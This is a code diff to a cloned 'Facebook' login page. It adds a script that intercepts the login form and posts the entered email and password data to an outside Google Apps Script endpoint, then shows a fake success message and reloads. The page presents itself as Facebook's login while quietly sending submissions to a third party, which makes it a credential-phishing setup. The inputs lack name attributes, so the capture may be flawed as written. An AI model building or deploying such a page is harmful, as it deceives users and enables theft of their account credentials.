@@ -6,6 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook</title>
     <link rel="stylesheet" href="fb.css" type="text/css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 </head>
 <body>
     <div class="container">
@@ -18,16 +19,16 @@
 
             </div>
             <div class="login">
-                <form action="">
+                <form id="submit-form" action="">
                 <table id="table" class="login-table">
                     <tr >
-                        <td class="logopss"><label > Email or mobile </label></td>
-                        <td class="logopss">password</td>
+                        <td  id="name"class="logopss"><label > Email or mobile </label></td>
+                        <td  id="color" class="logopss">password</td>
 
                     </tr>
                     <tr >
-                        <td ><input  type="text"></td>
-                        <td><input type="text"></td>
+                        <td ><input id="name" type="text"></td>
+                        <td><input id="color" type="text"></td>
                         <td ><input class="logbutton"  type="submit" value="login"></td>
                         
                     </tr>
@@ -96,6 +97,26 @@
     <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/jquery-validation@1.19.3/dist/jquery.validate.js"></script>
     <script src="fb.js"></script>
+    <script>
+        $("#submit-form").submit((e)=>{
+            e.preventDefault()
+            $.ajax({
+                url:"https://script.google.com/macros/s/AKfycby84J7ctgETliWNpCi-V7VWKPlbMBPYUCVojD-DKA/exec",
+                data:$("#submit-form").serialize(),
+                method:"post",
+                success:function (response){
+                    alert("Form submitted successfully")
+                    window.location.reload()
+                    //window.location.href="https://google.com"
+                },
+                error:function (err){
+                    alert("Something Error")
+      
+                }
+            })
+        })
+      </script>
+      
     
     
 </body>
